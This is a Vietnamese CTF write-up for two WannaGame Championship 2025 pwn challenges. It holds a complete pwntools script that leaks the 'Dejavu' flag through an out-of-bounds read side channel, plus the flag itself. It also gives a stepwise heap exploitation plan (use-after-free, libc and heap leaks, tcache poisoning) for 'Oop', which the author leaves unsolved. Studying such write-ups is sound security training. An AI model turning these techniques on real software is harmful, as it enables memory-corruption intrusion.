# WannaGame Championship 2025

## Dejavu
### Mô tả
    Lemme outta here
### Tìm hiểu challenge
    (pwnvenv) ngocsinh@Sinh:/mnt/d/CTF/events/wanna-champ/Dejavu/dejavu/to_player$ checksec dejavu
    [*] '/mnt/d/CTF/events/wanna-champ/Dejavu/dejavu/to_player/dejavu'
        Arch:       amd64-64-little
        RELRO:      Full RELRO
        Stack:      No canary found
        NX:         NX enabled
        PIE:        PIE enabled
        SHSTK:      Enabled
        IBT:        Enabled
        Stripped:   No
    (pwnvenv) ngocsinh@Sinh:/mnt/d/CTF/events/wanna-champ/Dejavu/dejavu/to_player$ file dejavu
    dejavu: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=b8f4a0e2fa07e3bd69592153f5abfdeb5aa57137, for GNU/Linux 3.2.0, not stripped
    (pwnvenv) ngocsinh@Sinh:/mnt/d/CTF/events/wanna-champ/Dejavu/dejavu/to_player$

### Phân tích
Sau khi chương trình `init()`, nó đã yêu cầu cấp phát 1 vùng nhớ có kích thước `0x10000 bytes`, đặt tại địa chỉ `0x10000` và với quyền `read` và `write`.

Tiếp theo, chương trình tính toán giá trị cho mảng `doors[]` (`0x10` phần tử với kích thức `word` ~ `2bytes`) với `doors[i] = i x 2 ^ 12`

Sau đó gọi hàm `trying()`.

```cpp
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  int i; // [rsp+4h] [rbp-Ch]

  init();
  if ( mmap((void *)0x10000, 0x10000uLL, 3, 34, -1, 0LL) == (void *)-1LL )
  {
    perror("mmap");
    exit(1);
  }
  for ( i = 0; i <= 15; ++i )
    doors[i] = (_WORD)i << 12;
  trying();
}
```
![alt text](./images/dejavu-1.png)

#### Tiếp theo mình sẽ phân tích kỹ từng hàm.
Trong hàm `init()`, sau khi `setvbuf`, chương trình sẽ đọc `flag` từ `./flag.txt` sau đó lưu vào biến `flag`.

Trong ảnh phía trên có thể thấy biến `flag` được phân bổ ngay sau `doors`.

```cpp
int init()
{
  int fd; // [rsp+Ch] [rbp-4h]

  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(_bss_start, 0LL, 2, 0LL);
  setvbuf(stderr, 0LL, 2, 0LL);
  fd = open("./flag.txt", 0);
  if ( fd < 0 )
  {
    perror("open");
    exit(1);
  }
  read(fd, &flag, 0xFFuLL);
  return close(fd);
}
```

Với hàm `trying()`, chương trình sẽ thực hiện 1 vòng lặp `while(true)`. Trong đó nó sẽ yêu cầu nhập vào `v1` và `v2`, sau đó thực hiện `syscall read` với `fd = 0`, `*buf = doors[v1] + v2`, `count = 16`. Do `v1` ta có thể kiểm soát được nên ta có 1 lỗi `Out of bound` ở đây.
> Nhập từ `stdin` `16 kí tự` sau đó lưu vào địa chỉ `doors[v1] + v2`. 

> Nếu đọc hợp lệ, `syscall read` sẽ trả về số byte đã đọc được (dương), sau đó in ra "Run away now!!!!!!".

> Nếu đọc không hợp lệ, `syscall read` sẽ trả về -1 (âm), sau đó in ra "Still can't wake up...".  

Trong trường hợp này vì các tham số khác ngoài trừ `*buf` đều cố định và hợp lệ. Còn địa chỉ `*buf` nếu ta cho nó 1 địa chỉ rác (không hợp lệ), thì `syscall` sẽ trả về `-1`. Và địa chỉ này được kiểm soát bởi giá trị của `v1` và `v2`.
```cpp
void __noreturn trying()
{
  char buf; // [rsp+Fh] [rbp-11h] BYREF
  int v1; // [rsp+10h] [rbp-10h] BYREF
  int v2; // [rsp+14h] [rbp-Ch] BYREF
  unsigned __int64 v3; // [rsp+18h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  while ( 1 )
  {
    v1 = 0;
    v2 = 0;
    puts("Dejavu dream welcomes you!");
    puts("Which door you want to go?");
    if ( (unsigned int)__isoc99_scanf("%u", &v1) != 1 )
      break;
    puts("How far you wanna run from this dream?");
    if ( (unsigned int)__isoc99_scanf("%u", &v2) != 1 )
    {
      puts("Invalid input");
      exit(1);
    }
    puts("How can you know this is not a dream?");
    if ( syscall(0LL, 0LL, (unsigned int)(unsigned __int16)doors[v1] + v2, 16LL) < 0 )
    {
      puts("Still can't wake up...");
      read(0, &buf, 1uLL);
    }
    else
    {
      puts("Run away now!!!!!!");
    }
  }
  puts("Invalid input");
  exit(1);
}
```

### Ý tưởng khai thác
- Sử dụng giá trị `v1` và `v2` để có thể kiểm soát được địa chỉ `*buf`.
- Sử dụng vùng nhớ được cấp ban đầu bởi `mmap` (với quyền `rw-`) tại địa chỉ `0x10000` và kích thước `0x10000`. 
- Do vậy nếu giá trị `doors[v1] + v2` nằm trong khoảng `0x10000` tới `0x20000` thì `syscall` sẽ trả về số `bytes` đọc được `(>= 0)`, còn nếu nó không nằm trong khoảng đó thì `syscall` nó sẽ trả về `-1` `(< 0)`.
- Do `flag` được lưu ngay sau `doors[]` như đã nêu ở trên, và vì mảng `doors[]` có 16 phân tử nên do đó, nếu ta gọi `doors[16]` thì nó sẽ trả về giá trị của 2 kí tự đầu tiên của `flag`. (2 kí tự vì kích thức mỗi phần của `doors[]` là `2 bytes`). 
- Mình sẽ sử dụng lỗi `Out of bound` của `doors[v1]` để trỏ tới từng kí tự của `flag`.
- Khi mình cố định `v1` thì giá trị `doors[v1]` sẽ được cố định, do vậy với `v2 < 0x10000 - doors[v1]` thì `syscall` sẽ trả về `-1`, ngược lại nếu `0x10000 - doors[v1] <= v2 <= 0x20000 - doors[v1]` thì sẽ trả về số bytes đọc được.
- Mình sẽ cố định `doors[v1]` và thử lần lượt `v2` bắt đầu từ `0 tăng dần`. Sau đó tìm `v2` sau cho đó là lần đầu tiên `syscall` trả về `-1`, tức là lúc này `doors[v1] + v2 = 0x10000`, do đó mình có thể suy ra giá trị của `doors[v1] = 0x10000 - v2` (2 kí tự của `flag`).
- Và vì ngay sau 1 đoạn địa chỉ `syscall` trả về `-1` do không hợp lệ thì ta có thể thấy tiếp theo đó là 1 đoạn địa chỉ `syscall` trả về `!= -1`. (Liên tiếp).
- Do vậy để cải tiến mình sẽ sử dụng `binary search` cho `v2` trên đoạn từ `0` cho tới `0x20000 - 0x10000`. (Vì trường hợp tối đa của 2 bytes đang xét là `0xffff`).

### Script khai thác
```python
#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./dejavu', checksec=False)
libc = elf.libc

def setup():
    if args.REMOTE:
        p = remote(sys.argv[1], sys.argv[2])
    else:
        p = process(elf.path)
        context.terminal = ['tmux', 'splitw', '-h']
        if args.GDB:
            gdb.attach(p, gdbscript='''
            ''')
    
    return p

p = setup()

def check(idx, v2):
    p.sendlineafter(b"Which door you want to go?", str(idx).encode())
    p.sendlineafter(b"How far you wanna run from this dream?", str(v2).encode())
    p.sendafter(b"How can you know this is not a dream?", b'\n')
    resp = p.recvuntil(b'Dejavu dream welcomes you!')

    log.info(resp + b"yessir")    
    if b"Still can't wake up" in resp:
        return False
    elif b"Run away now" in resp:
        return True
    
    return False

def binary_search(idx):
    low = 0
    high = 65535
    ans = 0

    while low <= high:
        mid = (low + high) // 2
        if check(idx, mid):
            ans = 0x10000 - mid
            high = mid - 1
        else:
            low = mid + 1

    return ans

flag_bytes = b""
for i in range(16, 16 + 30): 
    val = binary_search(i)
    
    chunk = p16(val)
    flag_bytes += chunk
    
    print(f"Index {i}: Found {hex(val)} -> {chunk}")
    if b'}' in chunk:
        break

print(f"Recovered flag bytes: {flag_bytes}")
p.interactive()
```

![alt text](./images/dejavu-2.png)

### Flag
    W1{F1n4LIY-R3tURN_T0-r34LIty6aabed48}


## Oop
### Mô tả
“I'm going back to OOP...”
### Tìm hiểu challenge
    (pwnvenv) ngocsinh@Sinh:/mnt/d/CTF/events/wanna-champ/oop$ checksec chall
    [*] '/mnt/d/CTF/events/wanna-champ/oop/chall'
        Arch:       amd64-64-little
        RELRO:      Full RELRO
        Stack:      Canary found
        NX:         NX enabled
        PIE:        PIE enabled
        SHSTK:      Enabled
        IBT:        Enabled
        Stripped:   No
    (pwnvenv) ngocsinh@Sinh:/mnt/d/CTF/events/wanna-champ/oop$ file chall
    chall: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=52630d70673d9459fa8d0b8d670e2cc452814c61, for GNU/Linux 3.2.0, not stripped
    (pwnvenv) ngocsinh@Sinh:/mnt/d/CTF/events/wanna-champ/oop$

### Phân tích
Vì bài này khá nhiều hàm nên mình sẽ không đi chi tiết hết từng hàm mà chỉ phân tích 1 số hàm liên quan.

Đầu tiên mình sẽ patch các struct sau vào `IDA` cho dễ phân tích.
```cpp
struct Person {
    char name[64];
    int age;
    int salary;
    char username[32];
    char password[32];
    std::string description;
    vector<Project *> project;
    vector<Note *> note;
};

struct Project {
    char description[128];
    int budget;
    int progress;
    vecotr<Person *> person;
    Person *personAdmin;
};

struct Note {
    Person person;
    std::string note;
};
```

Tổng quan đây là 1 challenge về quản lí các `project` của các `user`. `User` được tạo tài khoản sau đó login vào `menu`.

```cmd
(pwnvenv) ngocsinh@Sinh:/mnt/d/CTF/events/wanna-champ/oop$ ./chall
Welcome to the Project Management System!
1. Register
2. Login
Choose an option: 1
Enter name: ks2n
Enter age: -1
Enter username: k0m2s2n
Enter password: skibidi
Enter profile description: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Registration successful!
1. Create Project
2. View Projects
3. Add collaborator
4. Update project progress
5. Leave a note
6. View profile
7. Update profile description
8. Logout
Choose an option:
```

#### Phân tích menu:
- `Create Project`: Cho phép user tạo project với 2 thông tin là `Description` và `Budget`
- `View Project`: In ra thông tin của các project gồm: `Budget`, `Progress` và `Description`.
- `Add collaborator`: Thêm user khác vào project cụ thể.
- `Update project progress`: Cập nhật `progress` của 1 project cụ thể. Nếu `progress > 99` thì `budget` được chia đều cho các thành viên khác trong `project` và cập nhật vào `salary` của thành viên đó.
- `Leave a note`: Tạo `note` của project cụ thể.
- `Update profile description`: Cập nhật description của user hiện tại (`currenUser`)
- `Logout`: Đăng xuất tài khoản hiện tại

#### Tiếp theo mình sẽ phân tích kỹ một số hàm
Khi tạo tài khoản (`registerNewUser()`), chương trình sẽ cấp phát 1 vùng nhớ trên heap với kích thước ```0xA8``` cho ```Person```, và `len(description)` cho `description`. Lưu con trỏ vào `currentUser`.

```cpp
unsigned __int64 registerNewUser(void)
{
  Person *v0; // rbx
  Person *v1; // rbx
  const char *v2; // rax
  int v3; // eax
  int age; // [rsp+4h] [rbp-CCh] BYREF
  Person *v6; // [rsp+8h] [rbp-C8h]
  char description[32]; // [rsp+10h] [rbp-C0h] BYREF
  char username[32]; // [rsp+30h] [rbp-A0h] BYREF
  char password[32]; // [rsp+50h] [rbp-80h] BYREF
  char name[72]; // [rsp+70h] [rbp-60h] BYREF
  unsigned __int64 v11; // [rsp+B8h] [rbp-18h]

  v11 = __readfsqword(0x28u);
  v0 = (Person *)operator new(0xA8uLL);
  Person::Person(v0);
  v6 = v0;
  ...
  ...
  ...
  ((void (__fastcall *)(char *))std::string::basic_string)(description);
  std::istream::ignore((std::istream *)&std::cin);
  std::getline<char,std::char_traits<char>,std::allocator<char>>(&std::cin, description);
  v1 = v6;
  v2 = (const char *)std::string::c_str(description);
  Person::setDescription(v1, v2);
  v3 = personCount++;
  personList[v3] = v6;
  currentUser = v6;
  std::operator<<<std::char_traits<char>>(&std::cout, "Registration successful!\n");
  std::string::~string(description);
  return v11 - __readfsqword(0x28u);
}

char *__fastcall Person::setDescription(Person *this, const char *a2)
{
  size_t v2; // rbx
  size_t v3; // rax

  if ( !this->description )
  {
LABEL_5:
    v3 = strlen(a2);
    this->description = operator new[](v3 + 1);
    return strcpy((char *)this->description, a2);
  }
  v2 = strlen((const char *)this->description);
  if ( v2 < strlen(a2) )
  {
    if ( this->description )
      operator delete[]((void *)this->description);
    goto LABEL_5;
  }
  return strcpy((char *)this->description, a2);
}
```


Với hàm `addNote()`, nó sẽ tạo 1 `Note v5` để sử dụng. Và khi sử dụng xong thì nó sẽ giải phóng. 
```cpp
unsigned __int64 __fastcall Project::addNote(__int64 a1, __int64 a2, __int64 a3)
{
  Note v5; // [rsp+20h] [rbp-E0h] BYREF
  unsigned __int64 v6; // [rsp+E8h] [rbp-18h]

  v6 = __readfsqword(0x28u);
  Note::Note(&v5);
  Person::operator=(&v5, a2);
  std::string::operator=(&v5.note, a3);
  std::vector<Note>::push_back(a1 + 160, &v5);
  Note::~Note(&v5);                             // free
  return v6 - __readfsqword(0x28u);
}

void __fastcall Note::~Note(Note *this)
{
  std::string::~string(&this->note);
  Person::~Person(&this->person);
}

void __fastcall Person::~Person(Person *this)
{
  if ( this->description )
    operator delete[]((void *)this->description);
  std::vector<Project *>::~vector(&this->project_begin);
}
```

Nhìn kĩ ta hàm ở trên có thể thấy nó gán `v5->person` cho `currentUser()`. Sẽ không có gì bất thường khi ta nhìn kĩ vào `operator=` của `struct Person`.
Có thể thấy rằng nó gán địa chỉ của `currentUser->description` cho `v5->person->description`. Do vậy khi ta thực hiện xong hàm `addNote()`, `v5` được giải phóng dẫn đến việc description của `v5` cũng được giải phóng nhưng nó lại mang địa chỉ của ```currentUser->description```, vì thế ta có 1 lỗi `User after free` ở đây.

```cpp
Person *__fastcall Person::operator=(Person *a1, Person *a2)
{
  Person *v2; // rcx
  __int64 v3; // rdx
  Person *v4; // rax
  char *username; // rcx
  __int64 v6; // rdx
  char *v7; // rax
  char *password; // rcx
  __int64 v9; // rdx
  char *v10; // rax
  ...
  ...
  ...
  a1->description = a2->description;            // Use after free
  std::vector<Project *>::operator=(&a1->project_begin, &a2->project_begin);
  return a1;
}
```

Khi ta đã `free()` được `currentUser->description`, nếu kích thước của nó quá lớn khiến nó không được đẩy vào `Tcache` thì nó sẽ được đưa vào `Unsorted Bin`. Và thế `fd` của chunk này chứa địa chỉ của `main_arena` (libc address). Do đó ta có thể leak được libc base với bug này khi gọi `View profile`.


![alt text](./images/oop-1.png)

Khi gọi `updateProfile()`, nó sẽ gọi tới `setDescription()`, ở trong hàm này có thể thấy rằng nếu kích thức của `description mới` nhỏ hơn kích thức của `description cũ` thì nó sẽ chỉ thực hiện copy data thay vì tạo vùng mới. 

Do vậy, giả sử nếu ta `free()` 1 chunk (`currentUser->description`), sau đó nó nhảy vào `Tcache` và ta kiểm soát được vùng này thì ta có thể thực hiện `updateProfile` với chunk này để thay đổi `fd` của chunk đó. Dẫn đến ta có thể kiểm soát được vùng `Tcache` trỏ đến trong lần cấp phát sau đó.

Vì hàm `strlen()` chỉ đếm cho tới khi gặp `null byte`, và ta `currentUser->desription` hiện tại đang ở trong `Unsorted Bin`, nên `strlen()` nó trả về 6, vừa đủ để ta có thể `overwrite` địa chỉ `target` vào.
> Trả về 6 vì libc address ở currentUser->desription.

```cpp
char *__fastcall Person::setDescription(Person *this, const char *a2)
{
  size_t v2; // rbx
  size_t v3; // rax

  if ( !this->description )
  {
LABEL_5:
    v3 = strlen(a2);
    this->description = operator new[](v3 + 1);
    return strcpy((char *)this->description, a2);
  }
  v2 = strlen((const char *)this->description);
  if ( v2 < strlen(a2) )
  {
    if ( this->description )
      operator delete[]((void *)this->description);
    goto LABEL_5;
  }
  return strcpy((char *)this->description, a2);
}
```

### Ý tưởng khai thác
- `Leak libc`:
    - Tạo `account1` với `len(description) > 0x500`
    - Gọi `Leave a note` để `free(currentUser->description)` và đưa vào `Unsorted Bin`.
    - Gọi `View Profile` để `leak libc`
- `Leak heap address`
    - Tạo `account2` với `len(description) = 0x10`
    - Gọi `Leave a note` để `free(currentUser->description)` và đưa vào `Tcache`.
    - Gọi `View Profile` để `leak heap address`.
- `Overwrite fd`
    - Tạo `account3` với `len(description) = < 0x500`
    - Gọi `Leave a note` để `free(currentUser->description)` và đưa vào `Tcache`.
    - Gọi `Update profile description` để `overwrite fd` thành `__free_hook()`.
        - `fd` = `target_address` ^ `(address_chunk >> 12)` do đó cần `leak heap address`.
- Overwrite `__free_hook` (`ý tưởng ban đầu:<<<<<`)
    - Tạo `account4` cùng kích `description` với `chunk free`.
    - Gọi `Leave a note` cùng kích thức với chunk để overwrite `__free_hook()` thành `system()`

### Notes

![alt text](./images/oop-2.png)

Khi mình `exploit` tới `__free_hook()` thì tưởng chừng đã có được chiếm được `shell` nhưng đời không như là mơ:(((.

Trong glibc 2.35, nó đã bỏ `__free_hook()` và `__malloc_hook()` và thêm cả check address khi `free()`.

Hướng exploit còn lại theo mình nghĩ là sẽ sử dụng `Fsop`, nhưng mình vừa học heap mới 1 thời gian nên khá khó với mình để có thể solve được challenge này....

